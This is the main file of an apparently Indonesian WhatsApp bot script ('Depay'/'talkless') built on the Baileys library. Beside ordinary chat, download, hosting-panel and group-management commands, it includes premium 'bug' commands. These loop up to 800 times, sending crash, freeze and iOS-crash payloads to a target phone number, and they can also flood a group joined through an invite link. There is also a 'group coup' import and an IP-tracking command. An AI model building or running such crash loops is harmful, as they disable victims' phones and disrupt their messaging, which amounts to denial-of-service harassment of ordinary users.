/*
Developer : Depay Dev
Script ini buatan Depay tanpa menggunakan base siapa pun.

semua script Depay ada di sini
https://depay.dev

#DepayGacor
*/


require('./Settings/config');

const { 
    default: makeWASocket, 
    prepareWAMessageMedia, 
    useMultiFileAuthState, 
    DisconnectReason,
    fetchLatestBaileysVersion, 
    makeInMemoryStore, 
    generateWAMessageFromContent, 
    jidDecode, 
    proto, 
    delay,
    getContentType, 
    downloadContentFromMessage, 
    makeCacheableSignalKeyStore, 
    Browsers,
    generateWAMessage,
    downloadAndSaveMediaMessage
} = require('@whiskeysockets/baileys');

const pino = require('pino');
const FileType = require('file-type');
const readline = require("readline");
const fs = require('fs');
const crypto = require("crypto");
const chalk = require('chalk');
const axios = require("axios");
const { exec } = require('child_process');
const moment = require("moment-timezone");
const { runSystemCheck } = require('./Asset/system');
const { DepayAI } = require('./Asset/depayai');
const util = require('util')
const speed = require('performance-now');
const { smsg, getBuffer, sleep, fetchJson, runtime, clockString, parseMention, tanggal } = require('./Asset/myfunction.js');
const { toAudio, toPTT } = require('./Asset/converter.js');
const { apikey, capikey, domain, egg, nestid, loc } = require('./Settings/panelSettings.js')
const { createPanel, createAdmin, listAdmin, listServer, delAdmin, delPanel, manageReseller, manageAdminPanel, capital, listUser, delUser } = require('./Asset/FiturV2/Cpanel.js'); 
const { groupAction, tagAll, getGroupLink, kudetaGrup } = require('./Asset/FiturV2/Group.js')
const { youtubePlay, ytmp3, playChannel } = require('./Asset/FiturV2/Yts.js')
const { getSourceCode, bratSticker, toBase64 } = require('./Asset/FiturV2/tools.js') 
const { capcutDl, mediafireDl, facebookDl, instagramDl, spotifyDl, ytmp4, tiktokMp3 } = require('./Asset/FiturV2/Downloader.js') 
const { 
    tiktokDownloader, 
    addPremiumUser, 
    deletePremiumUser, 
    getNewsletterMetadata,
    downloadViewOnce,
    igdl,
    getBrat,
    pickRandom,
    listKhodam,
    getKisahNabi,
    sendGroupStatus,
    getIPInfo,
    addOwner,
    delOwner,
    uploadToURL
} = require('./Asset/fiturr');

const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
const usePairingCode = true;

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    console.log(text); 
    return new Promise(resolve => rl.question('', answer => { 
        rl.close(); 
        resolve(answer); 
    }));
};


const useDatabaseSecurity = false; // true kalo pengen ada db nya, kalo gamau ada db nya tinggal false, gak perlu hapus db

// ini fangsen db ,kalo ga pengen pake db gak perlu di hapus, tinggal false aja yang useData itu
async function isAuthorizedNumber(phoneNumber) {
    if (!useDatabaseSecurity) {
        return true; 
    }

    const databaseURL = 'https://github.com/depay1221/depay.js/raw/refs/heads/main/keamanan'; //ganti jadi repo gh lu
    try {
        const response = await axios.get(databaseURL);
        if (response.data && response.data.dbny) {
            return response.data.dbny.includes(phoneNumber);
        }
        return false;
    } catch (error) {
        console.error('Error fetching database:', error.message);
        return false; 
    }
}

async function StartBot() {
    const { state, saveCreds } = await useMultiFileAuthState("session");
    const depayy = makeWASocket({
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: 'fatal' }),
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino().child({ level: 'silent', stream: 'store' })) },
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        patchMessageBeforeSending: (message) => {
            if (message.buttonsMessage || message.templateMessage || message.listMessage) {
                message = { viewOnceMessage: { message: { messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {} }, ...message } } };
            }
            return message;
        }
    });
    const manualPassword = 'talkless';
    
if (usePairingCode && !depayy.authState.creds.registered) {
    const inputPassword = await question(chalk.cyan.bold('\n[ ! ] Masukkan Password Bot: '));
    
    if (inputPassword !== manualPassword) {
        console.log(chalk.red.bold(`\n[ ERROR ] PASSWORD SALAH!`));
        process.exit(0);
    }

    console.log(chalk.green.bold(`\n[ OK ] Password Benar...`));
    
    const phoneNumber = await question(chalk.yellow.bold(`
╭━━━┳━━━┳━━━┳━━━┳╮╱╱╭╮
╰╮╭╮┃╭━━┫╭━╮┃╭━╮┃╰╮╭╯┃
╱┃┃┃┃╰━━┫╰━╯┃┃╱┃┣╮╰╯╭╯
╱┃┃┃┃╭━━┫╭━━┫╰━╯┃╰╮╭╯
╭╯╰╯┃╰━━┫┃╱╱┃╭━╮┃╱┃┃
╰━━━┻━━━┻╯╱╱╰╯╱╰╯╱╰╯
╭━━╮╭━━━┳━━━━╮
┃╭╮┃┃╭━╮┃╭╮╭╮┃
┃╰╯╰┫┃╱┃┣╯┃┃╰╯
┃╭━╮┃┃╱┃┃╱┃┃
┃╰━╯┃╰━╯┃╱┃┃
╰━━━┻━━━╯╱╰╯
  [ ? ] put  your fucking number (cont 254xxx): `));
const isAuthorized = await isAuthorizedNumber(phoneNumber);

if (!isAuthorized) {
    console.log(`❌ Nomor ${phoneNumber} tidak terdaftar!`);
    process.exit(1);
} else {
    console.log("✅ Akses diberikan....");
}   
    const code = await depayy.requestPairingCode(phoneNumber.trim(), "TALKLESS");
    
    console.log(chalk.black(chalk.bgCyan(` KODE PAIRING KAMU: `)) + chalk.white.bold(` ${code} `));
}


    await require('./Asset/depayoffc')(depayy) 
    depayy.ev.on('creds.update', saveCreds);
    store.bind(depayy.ev);

depayy.ev.on('connection.update', async (update) => { 
    const { connection, lastDisconnect } = update;
    if (connection === 'close') {
        if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) StartBot();
    } else if (connection === 'open') {
        console.log(chalk.green.bold('Berhasil terhubung'));
        await runSystemCheck(depayy, "WhatsAppConnect"); // Connect WhatsApp

        // list id ch
         depayy.newsletterFollow(`kosong`)  //ch depay 
    //     depayy.newsletterFollow(`kosong`)
    }
});

    depayy.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    };
     depayy.ev.on("messages.upsert", async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message) return;
            const m = smsg(depayy, mek, store);
            const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : ''
            
            const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
            const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : null;
            const isCmd = prefix ? body.startsWith(prefix) : false;
            const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
            const args = body.trim().split(/ +/).slice(1);
            const text = q = args.join(" ");
            const pushname = m.pushName || "No Name";
            const botNumber = depayy.user.id.split(':')[0] + '@s.whatsapp.net';
            const img = fs.readFileSync('./Asset/foto/poto.jpeg')      
            const from = m.key.remoteJid;        
            // Database & Permissions
            const premium = JSON.parse(fs.readFileSync("./database/premium.json"));     
            const ownerbot = JSON.parse(fs.readFileSync("./database/owner.json"));         
            const isCreator = [botNumber, ...ownerbot, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
            const isPremium = premium.includes(m.sender);     
            // Database panel
            const reseller = JSON.parse(fs.readFileSync("./database/reseller.json"))
            const isReseller = reseller.includes(m.sender)    
            const adminpanel = JSON.parse(fs.readFileSync("./database/adminPanel.json"))
            const isAdminPanel = adminpanel.includes(m.sender)     
            const isGroup = m.isGroup;
            const groupMetadata = isGroup ? await depayy.groupMetadata(m.chat).catch(() => null) : null;
            const groupName = groupMetadata?.subject || "Bukan Grup";
            const participants = isGroup && groupMetadata ? groupMetadata.participants : [];
            const groupOwner = isGroup && groupMetadata ? (groupMetadata.owner || m.chat.split("-")[0] + "@s.whatsapp.net") : "";
            const groupAdmins = isGroup ? participants.filter((v) => v.admin !== null).map((v) => v.id) : [];
            const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
            const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
            const quoted = m.quoted ? m.quoted : m;
            const qmsg = (quoted.msg || quoted);
            const mime = qmsg.mimetype || '';
            const isMedia = /image|video|sticker|audio/.test(mime);                  
            if (depayy.user && !depayy.isBaseAuthorized) {
            console.log(chalk.white.bgRed.bold(`Gagal Terhubung Ke WhatsApp\ncoba hapus session dan start ulang`))
                process.exit(1);
            }
            const lol = { key: { fromMe: false, participant: "0@s.whatsapp.net", remoteJid: "status@broadcast" }, message: { orderMessage: { orderId: "2001", thumbnail: img, itemCount: "999991", status: "INQUIRY", surface: "CATALOG", message: `⚝ 𝐓𝐀𝐋𝐊𝐋𝐄𝐒𝐒💓`, token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==" } }, contextInfo: { mentionedJid: ["120363369514105242@s.whatsapp.net"], forwardingScore: 999, isForwarded: true } };
            const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `⚝ talkless  - DEV`}}}
           // Log Message
           if (m.message && !m.isGroup) {
              console.log(chalk.yellow(`▢ New Private Message`));
              console.log(
                chalk.green(
                  `   ⌬ Dari: ${pushname}\n` +
                  `   ⌬ Pesan: ${m.body || m.mtype}\n`
                  )
               );
            }

            if (!depayy.public && !isCreator) return;            
            const sendReact = async (emote = "🌻") => {
              await depayy.sendMessage(m.chat, {
                react: {
                  text: emote,
                  key: m.key,
                },
              })
            }
            
            const {
              MenuBotDepay3,
              payreply,
              MenuBotDepay2,
              WelcomeMenuDepay
            } = require('./tampilan.js');            
            const depayybut = (anu) => {
              const lolii = {
                key: {
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: 'status@broadcast'
                },
                message: {
                  orderMessage: {
                    orderId: "2009",
                    thumbnail: img,
                    itemCount: 989282,
                    status: "INQUIRY",
                    surface: "CATALOG",
                    message: `⚝ talkless  - AI`,
                    token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
                  }
                },
                contextInfo: {
                  mentionedJid: [m.sender],
                  forwardingScore: 999,
                  isForwarded: true,
                }
              }
              const { message, key } = generateWAMessageFromContent(m.chat, {
                interactiveMessage: {
                  body: { text: anu },
                  footer: { text: `Depay Bot AI` },
                  nativeFlowMessage: {
                    buttons: []
                  }
                },
              }, { quoted: lolii })
              depayy.relayMessage(m.chat, { viewOnceMessage: { message } }, { messageId: key.id })
            }               
            // Fungsi Bug 
            const {
              blankgb,
              fcgb         
            } = require('./Asset/FunctionBvg/BugGroup');       
            const {
              crashhv1,
              crashv3     
            } = require('./Asset/FunctionBvg/ForcloseDepay');
            async function _Buk1(depayy, target) {
              let count = 0;
              for (let i = 0; i <= 800; i++) {
                count++;  
                console.log(chalk.yellow(`[ ${count} ] Meluncurkan Hard Forclose Bug...`)); 
                await crashhv1(depayy, target);
                await sleep(1000);
                await crashv3(depayy, target);
                await sleep(1000);
              }
              console.log(chalk.green(`Sukses Send Bak Njink ${target}`));
            }            
            //Fungsi Delay Bug
            const {
               DelayOverload,
               DerlayInvisV3
            } = require('./Asset/FunctionBvg/DelayBvg');
            async function _Buk2(depayy, target) {
              let count = 0;
              for (let i = 0; i <= 500; i++) {
                count++;  
                console.log(chalk.cyan(`[ ${count} ] Meluncurkan Delay Bug Hard...`)); 
                await DelayOverload(depayy, target);
                await sleep(1000);
                await DerlayInvisV3(depayy, target);
                await sleep(2000);
              }
              console.log(chalk.green(`Sukses Send Bak Njink ${target}`));
            }
            // IOS Bug
            const {
              IOScrash
            } = require('./Asset/FunctionBvg/IOSBvg');
            async function _Buk3(depayy, target) {
              let count = 0;
              for (let i = 0; i <= 500; i++) {
                count++;  
                console.log(chalk.red(`[ ${count} ] Meluncurkan Delay Bug Hard...`)); 
                await IOScrash(depayy, target);
                await IOScrash(depayy, target);
                await sleep(2000);
              }
              console.log(chalk.green(`Sukses Send Bak Njink ${target}`));
            }  
            // End Function          
            switch(command) {
              //Case Fitur Ai
              case 'depay': {
                if (!text) return depayybut(`iya bang?`);
                let hasil = await DepayAI(m.sender, text);
                depayybut(hasil)
              }
              break; 
              //====           
              case "self": {
                if (!isCreator) return payreply("Khusus Owner", lol, m, depayy, proto) 
                depayy.public = false
                payreply(`successfully changed to ${command}`, lol, m, depayy, proto)
              }
              break;
              case "public": {
                if (!isCreator) return payreply("Khusus Owner", lol, m, depayy, proto) 
                depayy.public = true
                payreply(`successfully changed to ${command}`, lol, m, depayy, proto)
              }
              break;
                // Add / Del = Prem / Owner
                case "addprem": {
                    if (!isCreator) return payreply(mess.owner, lol, m, depayy, proto);
                    let nomor = args[0]?.replace(/[^0-9]/g, '');
                    if (!nomor) return payreply(`⚠️ Contoh: ${prefix + command} 628xxx`, lol, m, depayy, proto);
                    let jid = nomor + "@s.whatsapp.net";
                    const [cek] = await depayy.onWhatsApp(jid);
                    if (!cek?.exists) return payreply(`❌ Nomor tidak terdaftar di WhatsApp!`, lol, m, depayy, proto);
                    const success = addPremiumUser(jid);
                    if (!success) return payreply(`⚠️ Nomor tersebut sudah menjadi user Premium!`, lol, m, depayy, proto);
                    payreply(`✅ Berhasil! Nomor @${nomor} sekarang adalah user Premium.`, lol, m, depayy, proto, {
                        mentions: [jid]
                    });
                }
                break;
                case "delprem": {
                    if (!isCreator) return payreply(mess.owner, lol, m, depayy, proto);
                    let nomor = args[0]?.replace(/[^0-9]/g, '');
                    if (!nomor) return payreply(`⚠️ Contoh: ${prefix + command} 628xxx`, lol, m, depayy, proto);
                    let jid = nomor + "@s.whatsapp.net";
                    const success = deletePremiumUser(jid);
                    if (!success) return payreply(`⚠️ Nomor @${nomor} memang bukan user Premium.`, lol, m, depayy, proto, { mentions: [jid] });
                    payreply(`✅ Berhasil! Nomor @${nomor} telah dihapus dari daftar Premium.`, lol, m, depayy, proto, {
                        mentions: [jid]
                    });
                }
                break;
                case "addowner": {
                    if (!isCreator) return payreply(mess.owner, lol, m, depayy, proto)
                    let nomor = (m.quoted ? m.quoted.sender : (m.mentionedJid?.[0] || args[0]))?.replace(/[^0-9]/g, '')
                    if (!nomor) return payreply(`⚠️ Tag/Reply/Ketik nomornya Bang`, lol, m, depayy, proto)    
                    let jid = nomor + "@s.whatsapp.net"
                    if (addOwner(jid)) {
                        payreply(`✅ Berhasil! @${nomor} sekarang adalah Owner.`, lol, m, depayy, proto, { mentions: [jid] })
                    } else {
                        payreply(`⚠️ Nomor tersebut sudah ada di list Owner!`, lol, m, depayy, proto)
                    }
                }
                break;
                case "delowner": {
                    if (!isCreator) return payreply(mess.owner, lol, m, depayy, proto)
                    let nomor = (m.quoted ? m.quoted.sender : (m.mentionedJid?.[0] || args[0]))?.replace(/[^0-9]/g, '')
                    if (!nomor) return payreply(`⚠️ Tag/Reply/Ketik nomornya Bang`, lol, m, depayy, proto)
                    
                    let jid = nomor + "@s.whatsapp.net"
                    if (delOwner(jid)) {
                        payreply(`✅ Berhasil! @${nomor} dicopot dari jabatan Owner.`, lol, m, depayy, proto, { mentions: [jid] })
                    } else {
                        payreply(`❌ Nomor tersebut tidak ada dalam list Owner!`, lol, m, depayy, proto)
                    }
                }
                break;
                //Fun menu
                case 'cekkhodam': case 'cekkodam': {
                    if (!text) return payreply('Nama siapa yang mau di cek khodam nya?', lol, m, depayy, proto)
                    payreply(`*Khodam ${text} adalah:* ${pickRandom(listKhodam)}`, lol, m, depayy, proto)
                }
                break;
                case 'kisahnabi': {
                    if (!text) return payreply(`Masukan nama nabi\nContoh: kisahnabi adam`, lol, m, depayy, proto)
                    let hasil = await getKisahNabi(text)
                    if (!hasil) return payreply("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital", lol, m, depayy, proto)
                    payreply(hasil, lol, m, depayy, proto)
                }
                break;                
                // Tools Menu
                case 'cekidch': {
                  if (!text?.includes("https://whatsapp.com/channel/")) {
                    return payreply(`⚠️ Link tidak valid!\nContoh: ${prefix + command} https://whatsapp.com/channel/xxxx`, lol, m, depayy, proto);
                  }
                  try {
                    const res = await getNewsletterMetadata(depayy, text);  
                    const caption = "*NEWSLETTER INFO*\n• Nama: " + res.name + "\n• ID: " + res.id + "\n• Pengikut: " + res.subscribers + "\n• Status: " + res.state + "\n• Verified: " + (res.verification === "VERIFIED" ? "✅" : "❌")
                    const msg = generateWAMessageFromContent(m.chat, {
                      viewOnceMessage: {
                        message: {
                          interactiveMessage: {
                            body: { text: caption },
                            footer: { text: `© Depay Bot` },
                            nativeFlowMessage: {
                              buttons: [{
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Salin ID Saluran",
                                  copy_code: res.id
                                })
                              }]
                            }
                          }
                        }
                      }
                    }, { quoted: lol });
                    await depayy.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
                  } catch (err) {
                    payreply("❌ ID tidak ditemukan atau terjadi kesalahan.", lol, m, depayy, proto);
                  }
                }
                break;                
                case "tourl": {
                    if (!/image|video/.test(mime)) return payreply("kirim/reply foto atau video", lol, m, depayy, proto)
                    let media = await depayy.downloadAndSaveMediaMessage(quoted)
                    const { links, teks } = await uploadToURL(fs.readFileSync(media), mime)
                    fs.unlinkSync(media)

                    let msg = generateWAMessageFromContent(m.chat, {
                        viewOnceMessage: {
                            message: {
                                interactiveMessage: {
                                    body: { text: teks },
                                    footer: { text: `⚝ talkless ` },
                                    nativeFlowMessage: {
                                        buttons: [
                                            { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "Copy Pixhost", copy_code: links.pixhost }) },
                                            { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "Copy Catbox", copy_code: links.catbox }) },
                                            { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "Copy Uguu", copy_code: links.uguu }) }
                                        ]
                                    }
                                }
                            }
                        }
                    }, { quoted: lol })
                    await depayy.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
                }
                break;
                case 'trackip': {
                    if (!args[0]) return payreply(`Format: ${prefix}trackip <IP>\nContoh: ${prefix}trackip 8.8.8.8`, lol, m, depayy, proto)
                    let ipData = await getIPInfo(args[0])
                    if (!ipData) return payreply("❌ Error: IP tidak valid atau tidak ditemukan.", lol, m, depayy, proto)
                    let caption = `📍 *IP TRACKING RESULT*
- IP: ${ipData.ip}
- Country: ${ipData.country}
- City: ${ipData.city}
- ISP: ${ipData.isp}
- Timezone: ${ipData.timezone_gmt}
- Lat/Lon: ${ipData.latitude}, ${ipData.longitude}`
                    await depayy.sendMessage(m.chat, {
                        location: { 
                            degreesLatitude: parseFloat(ipData.latitude), 
                            degreesLongitude: parseFloat(ipData.longitude),
                            name: `IP: ${ipData.ip}`, 
                            address: `${ipData.org} (${ipData.country})`
                        },
                        caption: caption,
                        footer: 'Depay Official'
                    }, { quoted: m })
                }
                break;
                case "cekidgc": {
                    try {
                        let code = text?.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/)?.[1]
                        let groupId = code ? (await depayy.groupGetInviteInfo(code)).id : (m.isGroup ? m.chat : null)        
                        if (!groupId) return payreply("Gunakan di grup atau sertakan link grup valid", lol, m, depayy, proto)
                        await depayy.relayMessage(m.chat, generateWAMessageFromContent(m.chat, {
                            viewOnceMessage: {
                                message: {
                                    interactiveMessage: {
                                        body: { text: `ID Grup:\n${groupId}` },
                                        nativeFlowMessage: {
                                            buttons: [{
                                                name: "cta_copy",
                                                buttonParamsJson: JSON.stringify({ display_text: "Copy ID", copy_code: groupId })
                                            }]
                                        }
                                    }
                                }
                            }
                        }, { quoted: lol }).message, {})
                    } catch (err) {
                        payreply("Gagal mengambil ID grup", lol, m, depayy, proto)
                    }
                }
                break;
                case "gethtml":
                case "getsource": {
                    await getSourceCode(depayy, m, q)
                }
                break;
                case "brat": {
                    await bratSticker(depayy, m, text)
                }
                break;                               
                case "tobase64": {
                    await toBase64(m, text)
                }
                break;                            
             //============//          
             // BUG PRIVATE
             //============//  
                case 'crashdep':
                case 'crash-invis':                                 
                case 'crash-x':
                case 'infinity-crash ':
                case 'hard-crash': 
                case 'crash-xv1':
                case 'forx-andro': {
                    if (!isCreator && !isPremium) return payreply(`owner only!`, lol, m, depayy, proto);
                    if (!q) return payreply(`Example: ${prefix + command} 628xxx`, lol, m, depayy, proto);
                    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                    await payreply(`Berhasil Mengirim Bug Ke Target\n- Target ${target}`, lol, m, depayy, proto);
                    await _Buk1(depayy, target, true);
                }
                break;
                // delay bug
                case 'delay-buldo':
                case 'delay-perma':
                case 'delay-hard': 
                case 'delay-invis':
                case 'delay-infinity': {
                    if (!isCreator && !isPremium) return payreply(`owner only!`, lol, m, depayy, proto);
                    if (!q) return payreply(`Example: ${prefix + command} 628xxx`, lol, m, depayy, proto);
                    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                    await payreply(`Berhasil Mengirim Bug Ke Target\n- Target ${target}`, lol, m, depayy, proto);
                    await _Buk2(depayy, target, true);
                }
                break; 
                case 'force-ios':   
                case 'crash-ios': 
                case 'invis-ios': {
                    if (!isCreator && !isPremium) return payreply(`owner only!`, lol, m, depayy, proto);
                    if (!q) return payreply(`Example: ${prefix + command} 628xxx`, lol, m, depayy, proto);
                    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                    await payreply(`Berhasil Mengirim Bug Ke Target\n- Target ${target}`, lol, m, depayy, proto);
                    await IOScrash(depayy, target);
                }
                break;                                            
             //============//          
             // BUG GROUP
             //============//  
                case 'bvggb':    
                case 'crashgb': {
                    if (!isCreator && !isPremium) return payreply(`Fitur Khusus Owner Jir`, lol, m, depayy, proto);
                    let code = text.split('.com/')[1];
                    if (!code) return payreply(`Mana linknya?`, lol, m, depayy, proto);
                    try {
                        let jid;
                        try {
                            jid = await depayy.groupAcceptInvite(code);
                        } catch (e) {
                            let info = await depayy.groupGetInviteInfo(code);
                            jid = info.id;
                        }
                        if (!jid) return payreply(`Gagal dapetin JID Group`, lol, m, depayy, proto);   
                        await payreply(`Target: ${jid}\nStatus: Meluncur...`, lol, m, depayy, proto);
                        for (let r = 0; r < 100; r++) {
                            await fcgb(depayy, jid);
                            await sleep(2000); 
                        }
                    } catch (err) {
                        payreply(`Error: Link Invalid atau Bot di-kick`, lol, m, depayy, proto);
                    }
                }
                break;
                case 'blankgb': {
                    if (!isCreator && !isPremium) return payreply(`Fitur Khusus Owner Jir`, lol, m, depayy, proto);
                    let code = text.split('.com/')[1];
                    if (!code) return payreply(`Mana linknya?`, lol, m, depayy, proto);
                    try {
                        let jid;
                        try {
                            jid = await depayy.groupAcceptInvite(code);
                        } catch (e) {
                            let info = await depayy.groupGetInviteInfo(code);
                            jid = info.id;
                        }
                        if (!jid) return payreply(`Gagal dapetin JID Group`, lol, m, depayy, proto);   
                        await payreply(`Target: ${jid}\nStatus: Meluncur...`, lol, m, depayy, proto);
                        for (let r = 0; r < 100; r++) {
                            await blankgb(depayy, jid);
                            await sleep(2000); 
                        }
                    } catch (err) {
                        payreply(`Error: Link Invalid atau Bot di-kick`, lol, m, depayy, proto);
                    }
                }
                break;
                // Menu Bot
                case 'talkless': 
                case 'menu': {
                    await sendReact()
                    await WelcomeMenuDepay(depayy, m, pushname, runtime, qtext)
                }
                break;
                case 'bvgmenu': {
                    if (!isCreator && !isPremium) return payreply(`Mo ngapain bang? Khusus Premium Aja yang boleh liat`, lol, m, depayy, proto);
                    await sendReact()
                    await MenuBotDepay2(depayy, m, pushname, runtime, qtext) 
                }
                break;
                case 'allmnu': {
                    await sendReact()
                    await MenuBotDepay3(depayy, m, pushname, runtime, qtext) 
                }
                break;
                // Jangan Hapus credit ya, tambahin aja nama kamu
                case 'tqto': { 
                payreply(`*Credit Script*
Developer : depay.dev
Support : Aaiiurs🌻

*My Friend*
RapippModss ( Bestfriend )
RazaaModss ( Bestfriend )
Ditchie ( Bestfriend )
TraaModss ( Bestfriend )
RansTeach ( Bestfriend )
Dxhl ( Bestfriend )
Rapli ( Bestfriend )
Asep ( Bestfriend )
kelpin ( Bestfriend )`, lol, m, depayy, proto);
                }
                break;
                                
                //Update V2               
                //Cpanel Fiture
                case "1gb":
                case "2gb":
                case "3gb":
                case "4gb":
                case "5gb":
                case "6gb":
                case "7gb":
                case "8gb":
                case "9gb":
                case "10gb":
                case "unlimited":
                case "unli": {
                        if (!isAdminPanel && !isReseller) return payreply(`Khusus Res sama admin panel bang`, lol, m, depayy, proto)
                        if (!text) return payreply("username nya apa bang?", lol, m, depayy, proto)
                        await createPanel(command, text, m, depayy, domain, capikey, nestid, egg, loc)
                }
                break;
                case "cadmin": {
                        if (!isAdminPanel) return payreply(`Fitur ini khusus Owner Bang`, lol, m, depayy, proto)
                        if (!text) return payreply("username", lol, m, depayy, proto)
                        await createAdmin(text, args, m, depayy, domain, capikey, capital)
                }
                break;                    
                case "listadmin": {
                        if (!isAdminPanel) return payreply(`Khusus Owner Bang`, lol, m, depayy, proto)
                        await listAdmin(m, depayy, domain, capikey)
                }
                break;
                case "listpanel": case "listp": case "listserver": {
                        if (!isAdminPanel) return payreply(`Khusus Owner Panel Bang`, lol, m, depayy, proto)  
                        await listServer(m, depayy, domain, capikey)
                }
                break;
                case "deladmin": {
                        if (!isAdminPanel) return payreply(`Khusus Owner Panel Bang`, lol, m, depayy, proto)
                        await delAdmin(text, args, m, domain, capikey, capital)
                }
                break;
                case "delpanel": case "delsrv": {
                        if (!isAdminPanel) return payreply(`Khusus Owner Bang`, lol, m, depayy, proto)             
                        await delPanel(text, m, domain, capikey, capital)
                }
                break;
                case "addrespanel": case "addreseller": {
                    if (!isAdminPanel) return payreply(mess.owner, lol, m, depayy, proto);
                    let nomor = text.replace(/[^0-9]/g, '');
                    if (!nomor) return payreply(`⚠️ Contoh: ${prefix + command} 628xxx`, lol, m, depayy, proto);
                    let jid = nomor + "@s.whatsapp.net";                    
                    const res = manageReseller(jid, "add");
                    if (res === "exists") return payreply(`⚠️ Nomor @${nomor} sudah jadi Reseller!`, lol, m, depayy, proto, { mentions: [jid] });
                    payreply(`✅ Berhasil! Nomor @${nomor} sekarang adalah Reseller.`, lol, m, depayy, proto, { mentions: [jid] });
                }
                break;
                case "delrespanel": case "delreseller": {
                    if (!isAdminPanel) return payreply(mess.owner, lol, m, depayy, proto);
                    let nomor = text.replace(/[^0-9]/g, '');
                    if (!nomor) return payreply(`⚠️ Contoh: ${prefix + command} 628xxx`, lol, m, depayy, proto);
                    let jid = nomor + "@s.whatsapp.net";                    
                    const res = manageReseller(jid, "del");
                    if (res === "not_found") return payreply(`⚠️ Nomor @${nomor} bukan Reseller!`, lol, m, depayy, proto, { mentions: [jid] });
                    payreply(`❌ Berhasil mencabut status Reseller @${nomor}.`, lol, m, depayy, proto, { mentions: [jid] });
                }
                break;
                case "addadminpanel": case "addadmin": {
                    if (!isCreator) return payreply(mess.owner, lol, m, depayy, proto);
                    let nomor = text.replace(/[^0-9]/g, '');
                    if (!nomor) return payreply(`⚠️ Contoh: ${prefix + command} 628xxx`, lol, m, depayy, proto);
                    let jid = nomor + "@s.whatsapp.net";                    
                    const res = manageAdminPanel(jid, "add");
                    if (res === "exists") return payreply(`⚠️ Nomor @${nomor} sudah jadi Admin Panel!`, lol, m, depayy, proto, { mentions: [jid] });
                    payreply(`✅ Berhasil! Nomor @${nomor} sekarang adalah Admin Panel.`, lol, m, depayy, proto, { mentions: [jid] });
                }
                break;
                case "deladminpanel": case "deladminp": {
                    if (!isCreator) return payreply(mess.owner, lol, m, depayy, proto);
                    let nomor = text.replace(/[^0-9]/g, '');
                    if (!nomor) return payreply(`⚠️ Contoh: ${prefix + command} 628xxx`, lol, m, depayy, proto);
                    let jid = nomor + "@s.whatsapp.net";                    
                    const res = manageAdminPanel(jid, "del");
                    if (res === "not_found") return payreply(`⚠️ Nomor @${nomor} bukan Admin Panel!`, lol, m, depayy, proto, { mentions: [jid] });
                    payreply(`❌ Berhasil mencabut status Admin Panel @${nomor}.`, lol, m, depayy, proto, { mentions: [jid] });
                }
                break;    
                case "listuser": case "listusr": {
                        if (!isCreator && !isAdminPanel) return payreply(mess.owner, lol, m, depayy, proto)
                        await listUser(m, depayy, domain, capikey)
                }
                break;    
                case "deluser": {
                        if (!isCreator && !isAdminPanel) return payreply(mess.owner, lol, m, depayy, proto)
                        await delUser(m, domain, capikey, text, capital)
                }
                break;                                              
                //End FiturCpanel       
                
                //Group Fiture   
                case "opengc": 
                        return await groupAction(m, depayy, 'setting', 'not_announcement')
                break;
                case "closegc": 
                        return await groupAction(m, depayy, 'setting', 'announcement')
                break;
                case "add": 
                        if (!text) return payreply('Masukan nomor target bang!', lol, m, depayy, proto)
                        await groupAction(m, depayy, 'add', text)
                break;
                case "hidetag":
                case "ht": {
                    if (!m.isGroup) return m.reply(mess.group)
                    if (!q && !m.quoted) return m.reply(`Teksnya?`)
                    const mems = participants.map(a => a.id)
                    let msg = m.quoted ? (m.quoted.text || m.quoted.caption ? { text: m.quoted.text || m.quoted.caption } : { forward: m.quoted.fakeObj }) : { text: q }
                    await depayy.sendMessage(m.chat, { ...msg, mentions: mems }, { quoted: m })
                }
                break;
                case "kick":
                case "kik":
                case "dor": {
                    if (!m.isGroup) return payreply(mess.group)
